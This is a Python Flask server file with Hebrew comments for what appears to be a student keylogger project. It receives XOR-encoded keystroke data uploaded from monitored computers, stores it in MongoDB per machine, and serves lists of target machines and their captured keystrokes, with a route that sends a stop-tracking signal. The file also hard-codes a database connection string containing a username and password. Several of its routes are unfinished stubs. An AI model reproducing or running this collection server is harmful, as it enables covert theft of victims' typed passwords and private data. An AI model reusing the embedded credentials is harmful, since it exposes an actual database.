from flask import Flask,jsonify,request
from flask_cors import CORS
from encryptor import Encryptor
import json
import os
import time
import logging
from pymongo import MongoClient

class App:

    def __init__(self):
        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
        self.client = MongoClient(self.CONNECTION_STRING)
        self.DB = self.client["KeyLoggerProject"]
        self.collection = self.DB["computers"]
        self.stop_tracking = "success"


    def add_computer(self,data):
        #יצירת קולקשן למחשב הנוכחי
        if self.collection.find_one({"mac_name" : data["mac_name"]}) is not None:
            self._update_computer_data(data)
            return

        #הכנסת הנתונים לקולקשן
        data["data"] = [data["data"]]
        inserted_id = self.collection.insert_one(data).inserted_id
        #החזרת הid של הנתונים החדשים
        return inserted_id

    def _update_computer_data(self,data):
        self.collection.update_one(
            {"mac_name" : data["mac_name"]},
            { "$push" :  {"data" : data["data"]}}
        )

    def get_data(self,computer_name):
        #בדיקה האם הכניס שם מחשב
        if not computer_name:
            return "ERROR: Empty computer"

        #בדיקה האם המחשב נמצא במערכת
        if computer_name not in self.computer_connection:
            return "ERROR: not found"

        #קבלת רשימה של כל הקבצים
        data = self.collection.find_one({"mac_name" : self.computer_connection[computer_name]},{"data" : 1,"_id" : 0})
        return data.get("data",{})

    def get_computer_list(self):
        #קבלת רשימה של כל המחשבים
        computer_list = self.collection.find({},{"mac_name" : 1,"_id" : 0})
        computer_list = [computer["mac_name"] for computer in computer_list]
        #יצירת קישור בין שם מחשב לכתובת שלו
        self.computer_connection = {f"computer{i}" : computer_list[i] for i in range(len(computer_list))}
        #החזרת הרשימה של כל שמות המחשבים
        return list(self.computer_connection.keys())

class Users:

    def __init__(self):
        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
        self.client = MongoClient(self.CONNECTION_STRING)
        self.DB = self.client["UsersDatabase"]

    def verify_user(self,data:dict):
        #בדיקה מול המסד נתונים אם קיים המשתמש
        pass

    def check_if_user_exists(self,data):
        #בדיקה האם שם המשתמש קיים
        pass

    def add_user(self,data:dict):
        #הוספה של מפתח שם משתמש וערך הסיסמא
        pass

app = Flask(__name__)
CORS(app)

@app.route('/')
def home():
    pass

@app.route("/api/upload",methods=['POST'])
def upload():

    #קבלת הנתונים שהמחשב שלך
    data = request.get_json()

    # ניהול שגיאות
    if error_manager(data):
        return jsonify({"message": data})

    #יצירת אוביקט של הצפנה
    decryptor = Encryptor()

    #להחזיר את ההצפנה למתונים המקוריים
    data = decryptor.xor(data)

    #הוספת המחשב לDB
    manager.add_computer(data)

    #החזרת תשובה
    return jsonify({"message" : manager.stop_tracking})

def error_manager(data:dict) -> bool:
    #אם לא התקבל ערך
    if not data:
        return True
    return False

@app.route("/api/get_machine_list",methods=["GET"])
def get_target_machine_list():
    return jsonify({"message" : manager.get_computer_list()})

@app.route("/api/get_keystrokes",methods=["GET"])
def get_data_from_DB():
    #קבלת השם מחשב מהurl
    computer_name = request.args.get("computer")
    #קבלת הנתונים של המחשב מהדאטה בייס
    data = manager.get_data(computer_name)
    #החזרת תשובה
    return jsonify({"data" : data})


@app.route("/api/data",methods=['GET'])
def get_data():
    pass


@app.route('/user_verification',methods=['GET'])
def user_verification():
    #קבלת הנתונים שהמשתמש הכניס
    data = request.get_json()

    #בדיקת הנתונים מול המסד נתונים
    answer = users.verify_user(data)

    #החזרת תשובה
    return jsonify({"message" : answer})

@app.route('/create_user',methods=['POST'])
def create_user():
    #קבלת הנתונים מהמשתמש
    data = request.get_json()

    #בדיקה האם זה חוקי ואם קיים במערכת
    users.check_if_user_exists(data)

    #הכנסת המשתמש החדש למערכת
    users.add_user(data)

    #החזרת תשובה לפרונט
    return  jsonify()

@app.route("/stop_tracking_computer")
def stop_tracking_computer():
    manager.stop_tracking = "stop"


if __name__ == '__main__':
    manager = App()
    users = Users()
    app.run(debug=True,port=5000)

